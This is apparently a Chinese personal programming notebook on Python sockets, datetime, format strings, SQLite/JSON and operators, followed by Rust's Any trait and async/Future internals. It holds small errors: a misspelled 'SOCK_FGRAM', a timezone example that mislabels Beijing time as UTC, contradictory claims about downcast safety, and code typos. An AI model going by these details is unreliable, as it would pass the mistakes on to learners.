<h2 id="socket-3"><a class="header" href="#socket-3">Socket</a></h2>
<p>The Python interface is a straightforward transliteration of the Unix system call and library interface for sockets to Python’s object-oriented style.</p>
<p><img src="Language/Python/4%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BA%93/../images/1762677-20201007160746044-1258982359.png" alt="image.png-58.5kB" /></p>
<h2 id="api-2"><a class="header" href="#api-2">API</a></h2>
<h3 id="socket-4"><a class="header" href="#socket-4">socket</a></h3>
<p><code>socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)</code> 用于创建一个套接字。</p>
<ul>
<li>family: 协议族。常用的有<code>AF_INET</code>表示IPv4 Internet protocols ，我们的TCP协议和UDP协议就运行在IP协议上。<code>AF_NETLINK</code>常用于Kernel和User之间的通信。关于这些宏，建议参考<a href="https://man7.org/linux/man-pages/man2/socket.2.html#DESCRIPTION">man page</a></li>
<li>type: 指明了通信的语义，还可以通过OR运算表示其他的性质。</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>type</th><th>说明</th></tr></thead><tbody>
<tr><td>SOCK_STREAM</td><td>有序的，可靠的，全双工的，基于连接的字节流 （TCP）</td></tr>
<tr><td>SOCK_FGRAM</td><td>无连接的，不可靠的，有最大长度的 （UDP）</td></tr>
<tr><td>SOCK_SEQPACKET</td><td>有序的，可靠的，全双工的，有最大长度的，有序分组套接字 （SCTP）</td></tr>
<tr><td>SOCK_RAW</td><td>原始，直接访问网络协议</td></tr>
<tr><td>SOCK_RDM</td><td>可靠的数据报但是不保证顺序</td></tr>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>OR</th><th>说明</th></tr></thead><tbody>
<tr><td>SOCK_NONBLOCK</td><td>Set the O_NONBLOCK file status flag on the open file description (see open(2)) referred to by the new file descriptor.  Using this flag saves extra calls to fcntl(2) to achieve the same result.</td></tr>
<tr><td>SOCK_CLOEXEC</td><td>Set the close-on-exec (FD_CLOEXEC) flag on the new file  descriptor.  See the description of the O_CLOEXEC flag in open(2) for reasons why this may be useful.</td></tr>
</tbody></table>
</div>
<ul>
<li>proto: 协议。</li>
<li>fileno: If <em>fileno</em> is specified, the values for <em>family</em>, <em>type</em>, and <em>proto</em> are auto-detected from the specified file descriptor.</li>
</ul>
<h3 id="bind"><a class="header" href="#bind">bind</a></h3>
<p><code>socket.bind(address)</code> 绑定套接字到一个地址上，一个套接字只能绑定一次地址。</p>
<h3 id="listen"><a class="header" href="#listen">listen</a></h3>
<p><code>socket.listen([backlog])</code></p>
<p>Enable a server to accept connections. </p>
<p><em>backlog</em>  指定系统允许暂未 accept 的连接数，超过后将拒绝新连接。未指定则自动设为合理的默认值。</p>
<h3 id="accept"><a class="header" href="#accept">accept</a></h3>
<p><code>socket.accept()</code> Accept a connection. 在这之前必须已经bind了地址并且开始了listen。</p>
<ul>
<li>返回值是<code>(conn, address)</code>，<code>conn</code>是一个新的socket可以用来send和recv数据，address是连接客户端的地址。</li>
<li>阻塞式等待连接的到来。</li>
</ul>
<h3 id="connect-1"><a class="header" href="#connect-1">connect</a></h3>
<p><code>socket.connect(address)</code> 连接到 <em>address</em> 处的远程socket。</p>
<p><a href="https://docs.python.org/zh-cn/3/library/socket.html?highlight=socket#socket.socket.connect"><code>connect()</code></a> 操作也受超时设置的约束，通常建议在调用 <a href="https://docs.python.org/zh-cn/3/library/socket.html?highlight=socket#socket.socket.connect"><code>connect()</code></a> 之前调用 <a href="https://docs.python.org/zh-cn/3/library/socket.html?highlight=socket#socket.socket.settimeout"><code>settimeout()</code></a>，或将超时参数直接传递给 <a href="https://docs.python.org/zh-cn/3/library/socket.html?highlight=socket#socket.create_connection"><code>create_connection()</code></a>。但是，无论 Python 套接字超时设置如何，系统网络栈都有可能返回自带的连接超时错误。</p>
<p><code>s.connect_ex()</code>是connect()函数的扩展版本,出错时返回出错码,而不是抛出异常。</p>
<h3 id="close-1"><a class="header" href="#close-1">close</a></h3>
<p><code>socket.close()</code> 关闭套接字。</p>
<h2 id="sendrecv"><a class="header" href="#sendrecv">send&amp;recv</a></h2>
<p><code>socket.recv(bufsize[, flags])</code> 从套接字接收数据，<strong>通常用于有连接的socket（比如TCP）</strong></p>
<ul>
<li>返回值是一个字节对象，表示接收到的数据。</li>
<li><em>bufsize</em> 指定一次接收的最大数据量。</li>
<li><em>flags</em> 的含义请参阅 <a href="https://man7.org/linux/man-pages/man2/recv.2.html">man page</a></li>
<li><code>socket.recv_into(buffer[, nbytes[, flags]])</code>  将接收的字节写入buffer而不是创建新的字节串。</li>
</ul>
<p><code>socket.send(bytes[, flags])</code> 发送数据。返回值是要发送的字节数量。</p>
<ul>
<li>bytes 是要发送的数据</li>
<li>返回已发送的字节数。</li>
</ul>
<p><code>socket.sendall(bytes[, flags])</code> 发送数据</p>
<ul>
<li>与<code>send()</code>不同，本方法持续从 bytes 发送数据，直到所有数据都已发送或发生错误为止。成功后会返回 None。出错后会抛出一个异常，此时并没有办法确定成功发送了多少数据。</li>
</ul>
<p><code>socket.recvfrom(bufsize[, flags])</code>  从套接字接收数据。</p>
<ul>
<li>返回值是一对 <code>(bytes, address)</code>，其中 <em>bytes</em> 是字节对象，表示接收到的数据，<em>address</em> 是发送端套接字的地址。</li>
<li><code>socket.recvfrom_into(buffer[, nbytes[, flags]])</code> 将接收的字节写入buffer而不是创建新的字节串。</li>
</ul>
<p><code>socket.sendto(bytes, flags, address)</code> 发送数据给套接字。</p>
<ul>
<li>本套接字不应连接到远程套接字，而应由 address 指定目标套接字。可选参数 flags 的含义与上述 recv() 中的相同。本方法返回已发送的字节数。</li>
<li>所以，这两种方式常用于<strong>无连接的socket（比如UDP）</strong>。</li>
</ul>
<p><code>socket.sendfile(file, offset=0, count=None)</code> :使用高性能的 <a href="https://docs.python.org/zh-cn/3/library/os.html#os.sendfile"><code>os.sendfile</code></a> 发送文件，直到达到文件的 EOF 为止，返回已发送的字节总数。<em>file</em> 必须是一个以二进制模式打开的常规文件对象。如果指定了 <em>count</em>，它确定了要发送的字节总数，而不会持续发送直到达到文件的 EOF。返回时或发生错误时，文件位置将更新，在这种情况下，<a href="https://docs.python.org/zh-cn/3/library/io.html#io.IOBase.tell"><code>file.tell()</code></a> 可用于确定已发送的字节数。套接字必须为 <a href="https://docs.python.org/zh-cn/3/library/socket.html#socket.SOCK_STREAM"><code>SOCK_STREAM</code></a> 类型。不支持非阻塞的套接字。</p>
<h2 id="错误处理"><a class="header" href="#错误处理">错误处理</a></h2>
<p><a href="https://docs.python.org/3/library/exceptions.html#OSError">OSError</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="多线程"><a class="header" href="#多线程">多线程</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="时间和日期"><a class="header" href="#时间和日期">时间和日期</a></h1>
<p>虽然说获取一个准确的时间并不是容易的事情。但是你在写Python脚本处理时间的时候，不需要考虑什么东西。主要要注意的就是</p>
<ol>
<li>时区问题</li>
<li>存储类型的转换</li>
</ol>
<p>主要涉及的库是<code>time</code>和<code>datetime</code></p>
<pre><code class="language-python">from datetime import datetime
import time, calendar
</code></pre>
<p>时间，在Python中主要有有三种形式来存储</p>
<ul>
<li>浮点数，一般表示的从 epoch (1970 年 1 月 1 日 00:00:00 (UTC))开始的秒数的时间值。</li>
<li>类<code>time.struct_time</code>和<code>datetime.datetime</code>。他们其实挺像的，不过<code>datetime</code>是有时区信息的。</li>
<li>字符串。</li>
</ul>
<h2 id="获取现在的时间"><a class="header" href="#获取现在的时间">获取现在的时间</a></h2>
<p>第一行是本地时间，第二行是UTC时间。<code>ctime</code>是本地时间字符串，<code>time</code>没有本地和UTC之分。</p>
<p><img src="Language/Python/4%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BA%93/../images/now.drawio.svg" alt="now.drawio" /></p>
<h2 id="类型转换-1"><a class="header" href="#类型转换-1">类型转换</a></h2>
<p><img src="Language/Python/4%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BA%93/../images/trans.drawio.svg" alt="trans.drawio" /></p>
<h2 id="时区转换"><a class="header" href="#时区转换">时区转换</a></h2>
<p>UTC是世界标准时区，北京在UTC+8时区。</p>
<p>之前提到<code>datetime</code>类是带有时区信息的，如果他设置正确的话，实现时区转化的一个思路是，首先转化成标准浮点数然后在转化成对应时区的时间。</p>
<pre><code class="language-python">&gt;&gt;&gt; local = datetime.today()
&gt;&gt;&gt; local
datetime.datetime(2022, 8, 20, 17, 29, 42, 840167)
&gt;&gt;&gt; utc = datetime.fromtimestamp(local.timestamp(), tz=timezone.utc)
&gt;&gt;&gt; utc
datetime.datetime(2022, 8, 20, 9, 29, 42, 840167, tzinfo=datetime.timezone.utc)
</code></pre>
<p>另外，如果不想用本地时间（比如目的是让多端用同一个时间）。最好是都使用utc时间，或者是将utc时间做一个时区转换到某一个时区（比如北京时间）</p>
<pre><code class="language-python">&gt;&gt;&gt; offset = timedelta(hours=8)
&gt;&gt;&gt; utc
datetime.datetime(2022, 8, 20, 9, 44, 4, 738186, tzinfo=datetime.timezone.utc)
&gt;&gt;&gt; beijing = utc + offset
&gt;&gt;&gt; beijing
datetime.datetime(2022, 8, 20, 17, 44, 4, 738186, tzinfo=datetime.timezone.utc)
</code></pre>
<h2 id="format"><a class="header" href="#format">format</a></h2>
<p>上面提到的format是格式化字符串。</p>
<div class="table-wrapper"><table><thead><tr><th>Directive</th><th>Meaning</th></tr></thead><tbody>
<tr><td><code>%a</code></td><td>Locale’s abbreviated weekday name.</td></tr>
<tr><td><code>%A</code></td><td>Locale’s full weekday name.</td></tr>
<tr><td><code>%b</code></td><td>Locale’s abbreviated month name.</td></tr>
<tr><td><code>%B</code></td><td>Locale’s full month name.</td></tr>
<tr><td><code>%c</code></td><td>Locale’s appropriate date and time representation.</td></tr>
<tr><td><code>%d</code></td><td>Day of the month as a decimal number [01,31].</td></tr>
<tr><td><code>%H</code></td><td>Hour (24-hour clock) as a decimal number [00,23].</td></tr>
<tr><td><code>%I</code></td><td>Hour (12-hour clock) as a decimal number [01,12].</td></tr>
<tr><td><code>%j</code></td><td>Day of the year as a decimal number [001,366].</td></tr>
<tr><td><code>%m</code></td><td>Month as a decimal number [01,12].</td></tr>
<tr><td><code>%M</code></td><td>Minute as a decimal number [00,59].</td></tr>
<tr><td><code>%p</code></td><td>Locale’s equivalent of either AM or PM.</td></tr>
<tr><td><code>%S</code></td><td>Second as a decimal number [00,61].</td></tr>
<tr><td><code>%U</code></td><td>Week number of the year (Sunday as the first day of the week) as a decimal number [00,53]. All days in a new year preceding the first Sunday are considered to be in week 0.</td></tr>
<tr><td><code>%w</code></td><td>Weekday as a decimal number [0(Sunday),6].</td></tr>
<tr><td><code>%W</code></td><td>Week number of the year (Monday as the first day of the week) as a decimal number [00,53]. All days in a new year preceding the first Monday are considered to be in week 0.</td></tr>
<tr><td><code>%x</code></td><td>Locale’s appropriate date representation.</td></tr>
<tr><td><code>%X</code></td><td>Locale’s appropriate time representation.</td></tr>
<tr><td><code>%y</code></td><td>Year without century as a decimal number [00,99].</td></tr>
<tr><td><code>%Y</code></td><td>Year with century as a decimal number.</td></tr>
<tr><td><code>%z</code></td><td>Time zone offset indicating a positive or negative time difference from UTC/GMT of the form +HHMM or -HHMM, where H represents decimal hour digits and M represents decimal minute digits [-23:59, +23:59].</td></tr>
<tr><td><code>%Z</code></td><td>Time zone name (no characters if no time zone exists).</td></tr>
<tr><td><code>%%</code></td><td>A literal <code>'%'</code> character.</td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="trio"><a class="header" href="#trio">Trio</a></h1>
<p>Trio – a friendly Python library for async concurrency and I/O.</p>
<ul>
<li>https://github.com/python-trio/trio</li>
<li>https://trio.readthedocs.io/en/latest/tutorial.html</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="format-string-1"><a class="header" href="#format-string-1">Format String</a></h1>
<p>格式化字符串的两种写法，第一种更新一点，好像是3.8开始支持，不确定。</p>
<pre><code class="language-python">&lt;str&gt; = f'{&lt;el_1&gt;}, {&lt;el_2&gt;}'
&lt;str&gt; = '{}, {}'.format(&lt;el_1&gt;, &lt;el_2&gt;)
</code></pre>
<h2 id="对齐-1"><a class="header" href="#对齐-1">对齐</a></h2>
<p>注意，<code>el</code>可以是变量/数字，如果是字符串需要用引号括起来，</p>
<pre><code class="language-python">{&lt;el&gt;:&lt;10}    # '&lt;el&gt;      '
{&lt;el&gt;:^10}    # '   &lt;el&gt;   '
{&lt;el&gt;:&gt;10}    # '      &lt;el&gt;'
{&lt;el&gt;:.&lt;10}   # '&lt;el&gt;......'
{&lt;el&gt;:0}      # '&lt;el&gt;'
</code></pre>
<h2 id="整数"><a class="header" href="#整数">整数</a></h2>
<pre><code class="language-python">{123456:10}    # '    123456'
{123456:10,}   # '   123,456'
{123456:10_}   # '   123_456'
{123456:+10}   # '   +123456'
{123456:=+10}  # '+   123456'
{123456: }     # ' 123456'
{-123456: }    # '-123456'

{90:c}         # 'Z'
{90:b}         # '1011010'
{90:X}         # '5A'
</code></pre>
<h2 id="浮点数"><a class="header" href="#浮点数">浮点数</a></h2>
<pre><code class="language-python">{1.23456:10.3}    # '      1.23'
{1.23456:10.3f}   # '     1.235'
{1.23456:10.3e}   # ' 1.235e+00'
{1.23456:10.3%}   # '  123.456%'
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="virtual-environment"><a class="header" href="#virtual-environment">Virtual Environment</a></h1>
<p>执行下面的命令，在当前目录的.venv文件夹下创建虚拟环境</p>
<pre><code>python3 -m venv .venv
</code></pre>
<blockquote>
<p>虚拟环境是一个 Python 环境，安装到其中的 Python 解释器、库和脚本与其他虚拟环境中的内容是隔离的，且（默认）与“系统级” Python（操作系统的一部分）中安装的库是隔离的。</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="简单的数据持久化"><a class="header" href="#简单的数据持久化">简单的数据持久化</a></h1>
<p><a href="https://github.com/gto76/python-cheatsheet#json">https://github.com/gto76/python-cheatsheet#json</a></p>
<h1 id="sqlite-1"><a class="header" href="#sqlite-1">SQLite</a></h1>
<p>Server-less database engine that stores each database into a separate file.</p>
<h3 id="connect-2"><a class="header" href="#connect-2">Connect</a></h3>
<p>Opens a connection to the database file. Creates a new file if path doesn't exist.</p>
<pre><code class="language-python">import sqlite3
&lt;conn&gt; = sqlite3.connect(&lt;path&gt;)                # Also ':memory:'.
&lt;conn&gt;.close()                                  # Closes the connection.
</code></pre>
<h3 id="read"><a class="header" href="#read">Read</a></h3>
<p>Returned values can be of type str, int, float, bytes or None.</p>
<pre><code class="language-python">&lt;cursor&gt; = &lt;conn&gt;.execute('&lt;query&gt;')            # Can raise a subclass of sqlite3.Error.
&lt;tuple&gt;  = &lt;cursor&gt;.fetchone()                  # Returns next row. Also next(&lt;cursor&gt;).
&lt;list&gt;   = &lt;cursor&gt;.fetchall()                  # Returns remaining rows. Also list(&lt;cursor&gt;).
</code></pre>
<h3 id="write"><a class="header" href="#write">Write</a></h3>
<pre><code class="language-python">&lt;conn&gt;.execute('&lt;query&gt;')                       # Can raise a subclass of sqlite3.Error.
&lt;conn&gt;.commit()                                 # Saves all changes since the last commit.
&lt;conn&gt;.rollback()                               # Discards all changes since the last commit.
</code></pre>
<h4 id="or"><a class="header" href="#or">Or:</a></h4>
<pre><code class="language-python">with &lt;conn&gt;:                                    # Exits the block with commit() or rollback(),
    &lt;conn&gt;.execute('&lt;query&gt;')                   # depending on whether any exception occurred.
</code></pre>
<h2 id="json-1"><a class="header" href="#json-1">JSON</a></h2>
<p>Text file format for storing collections of strings and numbers.</p>
<pre><code class="language-python">import json
&lt;str&gt;    = json.dumps(&lt;object&gt;, ensure_ascii=True, indent=None)
&lt;object&gt; = json.loads(&lt;str&gt;)
</code></pre>
<h3 id="read-object-from-json-file"><a class="header" href="#read-object-from-json-file">Read Object from JSON File</a></h3>
<pre><code class="language-python">def read_json_file(filename):
    with open(filename, encoding='utf-8') as file:
        return json.load(file)
</code></pre>
<h3 id="write-object-to-json-file"><a class="header" href="#write-object-to-json-file">Write Object to JSON File</a></h3>
<pre><code class="language-python">def write_to_json_file(filename, an_object):
    with open(filename, 'w', encoding='utf-8') as file:
        json.dump(an_object, file, ensure_ascii=False, indent=2)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="文档和测试"><a class="header" href="#文档和测试">文档和测试</a></h1>
<p>unittest和doctest：是Python自带的测试框架。</p>
<p><a href="https://docs.pytest.org/en/6.2.x/">pytest</a>：一个优秀的第三方测试框架。</p>
<p><a href="https://www.sphinx-doc.org/zh_CN/master/contents.html">sphinx</a>：最出名的python API文档构建工具。</p>
<h2 id="pdoc3"><a class="header" href="#pdoc3"><a href="https://pdoc3.github.io/pdoc/">pdoc3</a></a></h2>
<p>一个弱但是简单的，Markdown友好的文档生成。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="把python当计算器"><a class="header" href="#把python当计算器">把Python当计算器</a></h1>
<h3 id="math"><a class="header" href="#math">Math</a></h3>
<pre><code class="language-python">from math import e, pi, inf, nan, isinf, isnan
from math import sin, cos, tan, asin, acos, atan, degrees, radians
from math import log, log10, log2
</code></pre>
<h3 id="statistics"><a class="header" href="#statistics">Statistics</a></h3>
<pre><code class="language-python">from statistics import mean, median, variance, stdev, quantiles, groupby
</code></pre>
<h3 id="bin-hex"><a class="header" href="#bin-hex">Bin, Hex</a></h3>
<pre><code class="language-python">&lt;int&gt; = ±0b&lt;bin&gt;                         # Or: ±0x&lt;hex&gt;
&lt;int&gt; = int('±&lt;bin&gt;', 2)                 # Or: int('±&lt;hex&gt;', 16)
&lt;int&gt; = int('±0b&lt;bin&gt;', 0)               # Or: int('±0x&lt;hex&gt;', 0)
&lt;str&gt; = bin(&lt;int&gt;)                       # Returns '[-]0b&lt;bin&gt;'.
</code></pre>
<h3 id="bitwise-operators"><a class="header" href="#bitwise-operators">Bitwise Operators</a></h3>
<pre><code class="language-python">&lt;int&gt; = &lt;int&gt; &amp; &lt;int&gt;                    # And (0b1100 &amp; 0b1010 == 0b1000).
&lt;int&gt; = &lt;int&gt; | &lt;int&gt;                    # Or  (0b1100 | 0b1010 == 0b1110).
&lt;int&gt; = &lt;int&gt; ^ &lt;int&gt;                    # Xor (0b1100 ^ 0b1010 == 0b0110).
&lt;int&gt; = &lt;int&gt; &lt;&lt; n_bits                  # Left shift (&gt;&gt; for right).
&lt;int&gt; = ~&lt;int&gt;                           # Not (also: -&lt;int&gt; - 1).
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="运算符"><a class="header" href="#运算符">运算符</a></h1>
<p>以下按照优先级顺序，当然你可以用括号来显式表明优先级</p>
<div class="table-wrapper"><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody>
<tr><td>yield</td><td>生成器函数send协议</td></tr>
<tr><td>lambda args: expr</td><td>创建匿名函数</td></tr>
<tr><td>x if y else z</td><td>选择表达式</td></tr>
<tr><td>x or y</td><td>逻辑或，短路原则</td></tr>
<tr><td>x and y</td><td>逻辑与，短路原则</td></tr>
<tr><td>not x</td><td>逻辑非</td></tr>
<tr><td>x in y, x not in y</td><td>成员关系</td></tr>
<tr><td>x is y, x is not y</td><td>对象<strong>一致性</strong>测试</td></tr>
<tr><td>x &lt; y, x &lt;=y, x &gt; y, x &gt;= y</td><td>大小比较，集合包含关系比较</td></tr>
<tr><td>x == y, x != y</td><td>对象<strong>值相等</strong>测试</td></tr>
<tr><td>x | y</td><td>位或，并集</td></tr>
<tr><td>x ^ y</td><td>位异或，对称差集</td></tr>
<tr><td>x &amp; y</td><td>位与，交集</td></tr>
<tr><td>x &lt;&lt; y, x &gt;&gt; y</td><td>位移</td></tr>
<tr><td>x + y</td><td>加法，拼接</td></tr>
<tr><td>x - y</td><td>减法，集合差集</td></tr>
<tr><td>x * y</td><td>乘法，重复</td></tr>
<tr><td>x % y</td><td>求余，格式化</td></tr>
<tr><td>x / y, x // y</td><td>除法，向下舍入除法</td></tr>
<tr><td>-x, +x</td><td></td></tr>
<tr><td>~x</td><td>位非</td></tr>
<tr><td>x ** y</td><td>幂运算</td></tr>
<tr><td>x[i]</td><td>索引</td></tr>
<tr><td>x[i:j:k]</td><td>分片</td></tr>
<tr><td>x(...)</td><td>调用（函数，方法，类等<strong>可调用对象</strong>）</td></tr>
<tr><td>x.attr</td><td>属性引用</td></tr>
<tr><td>(...)</td><td>元组，表达式，生成器表达式</td></tr>
<tr><td>[...]</td><td>列表，列表推导</td></tr>
<tr><td>{...}</td><td>字典、集合，集合和字典推导</td></tr>
</tbody></table>
</div>
<ul>
<li><code>1 &lt; x &lt; 3</code>这种写法在python中就是测试x大于1小于3的，你甚至还可以写<code>a&lt;b&lt;c&lt;d</code>这样的<strong>链式比较</strong>。</li>
<li>Python是支持像C语言一样的增量赋值的，<code>a += 1</code>，但是需要注意
<ul>
<li>对于可变对象，增量复制可以更好的优化为原地修改，而不是做一个复制（为什么说是可以更好优化呢？因为即使是可变对象，原地修改并不总是可行的）</li>
<li>对于不可变对象，实际上是做了一个重新的绑定</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rust"><a class="header" href="#rust">Rust</a></h1>
<p>因为从学习Rust的时候已经养成了通过记录来巩固学习的情况，所以里面的文章有的还不成熟，有的具有一定的参考价值。</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="any"><a class="header" href="#any">Any</a></h1>
<p>Rust中没有继承这个说法，不过可以将Any类比成Java中的<code>Object</code>，是所有类型的父类，可以**向下转型(downcast, 不安全)**到他的具体类型。</p>
<p>当然，这个类比并不准确。<code>Any</code>是一个trait，</p>
<ol>
<li><strong>大部分</strong>的类型都实现了这个trait。目前，带着非static生命周期引用的类型并没有实现。</li>
<li>他是携带具体的类型信息的，来实现运行时反射。</li>
</ol>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Any: 'static {
    fn type_id(&amp;self) -&gt; TypeId;
}
<span class="boring">}
</span></code></pre></pre>
<p><code>TypeId</code>就是他的具体类型信息。我们不要关心他内部的存储格式。</p>
<p>来看一个例子，在运行时判断传入参数的类型是否是String。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn is_string(s: &amp;dyn Any) -&gt; bool {
    TypeId::of::&lt;String&gt;() == s.type_id()
}
<span class="boring">}
</span></code></pre></pre>
<p>另外因为存储了类型信息，所以Rust中的向下转型是安全的。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="异步编程-1"><a class="header" href="#异步编程-1">异步编程</a></h1>
<h2 id="generatorfuture"><a class="header" href="#generatorfuture">Generator&amp;Future</a></h2>
<p>Generator和Future是后面异步的基础。不过他们并没有什么特殊之处。先来看</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Generator&lt;R = ()&gt; {
    type Yield;
    type Return;
    fn resume(
        self: Pin&lt;&amp;mut Self&gt;, 
        arg: R
    ) -&gt; GeneratorState&lt;Self::Yield, Self::Return&gt;;
}
<span class="boring">}
</span></code></pre></pre>
<p>不过，不像一般的trait，我们自己去为我们自己定义的struct实现它。<strong>我们是用一个写法非常类似闭包的东西自动生成一个实现了Generator的struct</strong>，而这种写法和闭包的区别在于如果是否有<code>yield</code>。比如下面这个例子，就是一个类似于Iterator的Generator。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span>#![feature(generators, generator_trait)]

<span class="boring">fn main() {
</span>use std::{ops::Generator, pin::Pin};
// 这个是返回值泛型，看到的时候楞了一下
pub fn count() -&gt; impl Generator&lt;Yield = u64, Return = ()&gt; {
    || {
        let mut x = 0;
        loop {
            x += 1;
            yield x;
        }
        return ();
    }
}
<span class="boring">}
</span></code></pre></pre>
<ul>
<li>像上面这样，我们只关心Yield的类型，不关心Return的类型，就跟<a href="https://doc.rust-lang.org/std/iter/trait.Iterator.html">Iterator</a>很像。<code>resume = next</code></li>
<li>又或者，我们只关心Return的类型，不关心Yield的类型，就跟<a href="https://doc.rust-lang.org/std/future/trait.Future.html">Future</a>很像，看下面的Future的定义，<code>resume = poll</code></li>
</ul>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 可以简单的将Future理解为下面这样
// trait SimpleFuture {
//     type Output;
//     fn poll(&amp;mut self, wake: fn()) -&gt; Poll&lt;Self::Output&gt;;
// }
trait Future {
    type Output;
    fn poll(self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Self::Output&gt;;
}

enum Poll&lt;T&gt; {
    Ready(T),
    Pending,
}
<span class="boring">}
</span></code></pre></pre>
<ul>
<li><code>Future</code>的操作（函数）只有一个，就是<code>poll</code>，字面意思就是轮询。轮询的结果可能是<code>Pending</code>，表示还没有算完；也可以是<code>Ready(T)</code>，返回结果。</li>
<li><code>poll</code>还附带了一个<code>wake</code>函数，可以将它理解为<strong>回调函数</strong>，我们每次<code>poll</code>发现<code>Pending</code>，就注册回调函数。当回调函数被调用时，就会再次执行<code>poll</code>。</li>
</ul>
<p>单看上面的代码，Future也没有什么特殊之处。事实上，<strong>他是异步计算单元的抽象</strong>，而具体异步计算单元的执行和调度才是异步发挥其高效性的地方。</p>
<blockquote>
<p>Futures are a concept that abstracts over how code is run. By themselves, they do nothing.</p>
</blockquote>
<h2 id="asyncawait"><a class="header" href="#asyncawait">async/await</a></h2>
<p>用async/await进行异步代码的开发是现在很流行的方式。如下面的例子</p>
<pre><pre class="playground"><code class="language-rust">use futures::executor::block_on;

async fn compute() -&gt; u64 {
    println!(&quot;Computing...&quot;);
    114
}

async fn hello_world() -&gt; u64 {
    let a = compute().await;
    let b = compute().await;
    a + b
}

fn main() {
    // let a: impl Future&lt;Output = u64&gt; = hello_world();
    assert_eq!(228, block_on(hello_world()));
}
</code></pre></pre>
<ol>
<li>
<p>写起来的<strong>逻辑</strong>和同步代码一模一样。不过，事实上<code>async</code>函数的参数可能是在其他线程执行的，我们要保证线程安全。</p>
</li>
<li>
<p><code>async</code>是什么意思呢？他用于<strong>定义异步函数/异步块(之后称为async块)</strong>。上面定义的<code>computer</code>和<code>hello_world</code>函数的实际返回值是一个实现了Future的struct（也可以简单的说<strong>返回了一个Future</strong>），也就是一个异步计算单元。</p>
</li>
<li>
<p><code>await</code>是什么意思呢？他<strong>在逻辑上，就是去执行Future并等待他完成</strong>。但是具体怎么等呢，这个是由<strong>异步运行时</strong>决定的。你可以简单理解为future.await在逻辑上为下面的代码</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>loop {
  match future.poll() {
    Pending =&gt; yield(),  // 让出CPU
    Ready(r) =&gt; break r; // 返回结果
  }
}
<span class="boring">}
</span></code></pre></pre>
</li>
</ol>
<h3 id="how-async-construct-a-future"><a class="header" href="#how-async-construct-a-future">How async construct a Future</a></h3>
<p>更准确的说法是，async是如何创造了一个匿名的struct，实现了Future的呢？参考tokio的文档<a href="https://tokio.rs/tokio/tutorial/async">https://tokio.rs/tokio/tutorial/async</a>。如果我们有一个非常简单的异步函数如下。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 假设func2() 也是async function, impl Future
async fn func1() {
    println!(&quot;func1&quot;);
    func2().await();
}
<span class="boring">}
</span></code></pre></pre>
<p>其实，async生成的匿名结构<strong>类似</strong>如下，是一个状态机。每次await都是一次状态的转移。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>enum _func1 {
    State0,
    State1(func2),
    Terminate,
}

impl Future for _func1 {
    use _func1::*;
    type Output = ();
    fn poll(mut self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;)
        -&gt; Poll&lt;()&gt;
    {
        loop {
        	match *self {
                State0 =&gt; {
                    println!(&quot;func1&quot;);
                    let future = func2();
                    *self = State1(future);
                }
                State1(ref mut future) =&gt; {
                    match Pin::new(future).poll(cx) {
                        Poll::Ready(out) =&gt; {
                            *self = Terminated;
                            return Poll::Ready(());
                        }
                        Poll::Pending =&gt; {
                            return Poll::Pending;
                        }
                    }
                }
                Terminated =&gt; {
                    panic!(&quot;future polled after completion&quot;);
                }
            }    
        }
        
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><code>async fn</code> 返回 <code>Future</code> ，而后者需要通过被不断的 <code>poll</code> 才能往前推进状态，同时该 <code>Future</code> 还能包含其它 <code>Future</code> ，那么问题来了。</p>
<ol>
<li>谁来负责调用最外层 <code>Future</code> 的 <code>poll</code> 函数？下面会介绍的<strong>异步运行时</strong>会给出答案。</li>
<li>难道需要不停的<code>poll</code>吗？并不用。当第一次<code>poll</code>返回<code>Pending</code>之后，下一次<code>poll</code>将由回调函数<code>wake</code>触发。</li>
<li>这样子感觉还是串行，异步的优势如何体现？每一次返回Pending之后，都调度到其他线程上。</li>
</ol>
<p>不过，在编程中，我们只需要一个<code>.await</code>，异步运行时就会自己帮我们去周期性的<code>poll</code>，在Pending之后调度到其他线程。</p>
<h2 id="顺序模型"><a class="header" href="#顺序模型">顺序模型</a></h2>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = a().await;
ley y = b(x).await;
<span class="boring">}
</span></code></pre></pre>
